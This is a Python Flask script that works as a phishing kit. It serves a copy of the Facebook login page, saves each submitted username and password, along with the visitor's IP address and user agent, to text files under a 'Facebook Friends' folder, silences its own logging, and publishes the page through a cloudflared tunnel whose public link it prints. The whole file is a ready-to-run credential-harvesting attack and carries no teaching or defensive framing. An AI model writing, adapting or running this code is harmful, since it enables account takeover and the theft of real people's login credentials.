import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'facebook-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/Facebook Friends")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['fb_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Facebook - Connect with friends</title>
        <style>
            :root {
                --fb-blue: #1877f2;
                --fb-green: #42b72a;
                --fb-dark-blue: #166fe5;
            }
            
            body {
                background: #f0f2f5;
                font-family: Helvetica, Arial, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            
            .container {
                display: flex;
                max-width: 980px;
                width: 100%;
                padding: 20px;
                align-items: center;
            }
            
            .left-section {
                flex: 1;
                padding: 20px;
            }
            
            .fb-logo {
                color: var(--fb-blue);
                font-size: 48px;
                font-weight: bold;
                margin-bottom: 16px;
            }
            
            .tagline {
                font-size: 24px;
                line-height: 28px;
            }
            
            .right-section {
                flex: 1;
                padding: 20px;
            }
            
            .login-box {
                background: white;
                border-radius: 8px;
                box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
                padding: 20px;
                max-width: 400px;
            }
            
            input {
                width: 100%;
                padding: 14px 16px;
                margin: 8px 0;
                border: 1px solid #dddfe2;
                border-radius: 6px;
                font-size: 17px;
                box-sizing: border-box;
            }
            
            input:focus {
                border-color: var(--fb-blue);
                outline: none;
            }
            
            .login-btn {
                background: var(--fb-blue);
                color: white;
                border: none;
                padding: 14px 16px;
                border-radius: 6px;
                font-size: 20px;
                font-weight: bold;
                width: 100%;
                margin: 8px 0;
                cursor: pointer;
            }
            
            .login-btn:hover {
                background: var(--fb-dark-blue);
            }
            
            .forgot-pw {
                color: var(--fb-blue);
                text-decoration: none;
                text-align: center;
                display: block;
                margin: 16px 0;
            }
            
            .divider {
                border-bottom: 1px solid #dadde1;
                margin: 20px 0;
            }
            
            .create-btn {
                background: var(--fb-green);
                color: white;
                border: none;
                padding: 14px 16px;
                border-radius: 6px;
                font-size: 17px;
                font-weight: bold;
                width: auto;
                margin: 0 auto;
                cursor: pointer;
                display: block;
            }
            
            .create-btn:hover {
                background: #36a420;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="left-section">
                <div class="fb-logo">facebook</div>
                <div class="tagline">Connect with friends and the world around you on Facebook.</div>
            </div>
            
            <div class="right-section">
                <div class="login-box">
                    <form action="/login" method="post">
                        <input type="text" name="username" placeholder="Email or phone number" required>
                        <input type="password" name="password" placeholder="Password" required>
                        <button type="submit" class="login-btn">Log In</button>
                        <a href="#" class="forgot-pw">Forgotten password?</a>
                        <div class="divider"></div>
                        <button type="button" class="create-btn">Create New Account</button>
                    </form>
                </div>
                <div style="text-align: center; margin-top: 28px; font-size: 14px;">
                    <strong>Create a Page</strong> for a celebrity, brand or business.
                </div>
            </div>
        </div>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('fb_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Username: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Logging In - Facebook</title>
        <style>
            body {
                background: #f0f2f5;
                font-family: Helvetica, Arial, sans-serif;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
            }
            .container {
                text-align: center;
                background: white;
                padding: 40px;
                border-radius: 8px;
                box-shadow: 0 2px 4px rgba(0, 0, 0, .1);
                max-width: 400px;
            }
            .fb-logo {
                color: #1877f2;
                font-size: 36px;
                font-weight: bold;
                margin-bottom: 20px;
            }
            .spinner {
                border: 4px solid #f3f3f3;
                border-top: 4px solid #1877f2;
                border-radius: 50%;
                width: 40px;
                height: 40px;
                animation: spin 2s linear infinite;
                margin: 0 auto 20px;
            }
            @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        </style>
        <meta http-equiv="refresh" content="3;url=/" />
    </head>
    <body>
        <div class="container">
            <div class="fb-logo">facebook</div>
            <div class="spinner"></div>
            <h2>Logging You In...</h2>
            <p>Please wait while we secure your connection.</p>
        </div>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"FaceFriends Public Link: {tunnel_url}")
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5000")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        sys.exit(0)